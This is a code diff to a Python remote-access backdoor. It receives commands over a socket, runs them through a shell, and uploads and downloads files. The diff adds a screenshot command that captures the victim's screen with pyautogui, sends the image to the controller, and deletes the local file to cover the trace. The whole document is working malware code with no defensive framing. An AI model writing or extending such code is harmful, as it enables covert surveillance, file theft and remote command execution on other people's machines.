@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import pyautogui
 
 def send_data(data):
 	jsondata = json.dumps(data)
@@ -34,6 +35,11 @@ def upload_file(file_name):
 	f = open(file_name, "rb")
 	s.send(f.read())
 
+def screenshot():
+	scrnsht = pyautogui.screenshot()
+	scrnsht.save("screenshot.png")
+
+
 def shell():
 	while True:
 		command = recv_data()
@@ -52,6 +58,11 @@ def shell():
 			download_file(command[7:])
 		elif command[:8] == "download":
 			upload_file(command[9:])
+		elif command[:10] == "screenshot":
+			screenshot()
+			upload_file('screenshot.png')
+			os.remove('screenshot.png')
+
 		else:
 			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			result = execute.stdout.read() + execute.stderr.read()
